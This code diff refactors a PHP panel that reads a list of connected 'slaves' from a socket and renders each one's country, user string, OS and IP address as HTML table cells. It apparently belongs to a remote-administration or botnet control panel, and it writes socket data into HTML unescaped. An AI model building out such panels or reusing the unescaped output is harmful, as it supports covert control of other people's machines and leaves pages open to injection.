@@ -15,17 +15,20 @@ class Request {
 		self::write($sock, 1);
 		$raw = socket_read($sock, 1024 * 10, PHP_NORMAL_READ) or die("Could not read from socket\n");
 		
-		$slaves = explode(";", $raw);
+		$slaveStrings = explode(";", $raw);
+		$slaves = array();
 		
-		foreach ($slaves as $slave) {
-			if (strlen($slave) <= 1) {
+		foreach ($slaveStrings as $string) {
+			if (strlen($string) <= 1) {
 				continue;
 			}
 
 			$s = new Slave();
-			$s->makearray($slave);
-			$s->printHtml();
+			$s->makearray($string);
+			$slaves[] = $s;
 		}
+		
+		return $slaves;
 	}
 	
 	private function write($sock, $s) {
@@ -47,10 +50,12 @@ class Slave {
 		);
 	}
 	
-	public function printHtml() {
-		$country = '<img src="images/flags/' . strtolower($this->array['country']) . '.png"> - ' . $this->array['country'];
+	public function getTableFormatted() {
+		$country = '<img src="images/flags/' . strtolower($this->array['country']) . '.png"> ' . $this->array['country'];
 		$userstring = '<b>' . $this->array['userstring'] . '</b>';
+		$os = $this->array['os'];
+		$ip = $this->array['ip'];
 		
-		echo $country . " - " . $userstring;
+		return "<td class=%c>" . $country . "</td>\n<td class=%c>" . $userstring . "</td>\n<td class=%c>" . $os . "</td>\n<td class=%c>$ip</td>\n";
 	}
 }
